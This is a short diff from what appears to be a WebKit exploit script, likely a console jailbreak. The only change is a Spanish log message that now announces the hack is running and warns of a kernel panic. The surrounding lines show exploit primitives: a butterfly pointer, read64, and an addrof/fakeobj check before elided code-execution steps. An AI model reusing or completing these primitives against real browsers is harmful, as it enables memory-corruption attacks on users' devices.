@@ -116,7 +116,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("webKit Cargado!. Ejecutando exploit (Posibilidad de Kernel Panic)");
+	debug_log("WEBKIT COMPLETO...EJECUTANDO HACK..(POSIBILIDAD DE KERNEL PANIC)");
 
 	/* Getting code execution */
 	/* ... */
